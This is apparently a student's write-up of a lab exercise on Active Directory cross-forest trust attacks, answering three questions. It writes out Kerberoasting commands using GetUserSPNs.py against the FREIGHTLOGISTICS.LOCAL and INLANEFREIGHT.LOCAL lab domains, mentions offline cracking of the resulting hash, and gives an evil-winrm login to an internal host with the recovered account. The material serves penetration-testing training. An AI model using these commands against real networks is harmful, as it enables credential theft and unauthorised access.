# Content

- [Content](#content)
  - [Question 1](#question-1)
    - [The way to hack](#the-way-to-hack)
    - [Answer](#answer)
  - [Question 2](#question-2)
    - [The way to hack](#the-way-to-hack-1)
    - [Answer](#answer-1)
  - [Question 3](#question-3)
    - [The way to hack](#the-way-to-hack-2)
    - [Answer](#answer-2)
  
## Question 1

### The way to hack

- I use command
- Payload:
  - [GetUserSPNs.py](http://getuserspns.py/) -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
  ![Picture](../../Image/Breaking%20Down%20Boundaries/7.png)

### Answer

![Picture](../../Image/Breaking%20Down%20Boundaries/8.png)

## Question 2

### The way to hack

- I run command.
- Payload:
  - `GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley`
  ![Picture](../../Image/Breaking%20Down%20Boundaries/9.png)
- After i have the hash then i just crack it normally.

### Answer

![Picture](../../Image/Breaking%20Down%20Boundaries/10.png)

## Question 3

### The way to hack

- I config file /etc/resolv.conf.
  ![Picture](../../Image/Breaking%20Down%20Boundaries/11.png)
- After that, i use evil-winrm to ssh to the windows.
- Payload:
  - evil-winrm -i 172.16.5.238 -u sapsso to log in to the domain and get the flag.

### Answer

![Picture](../../Image/Breaking%20Down%20Boundaries/12.png)
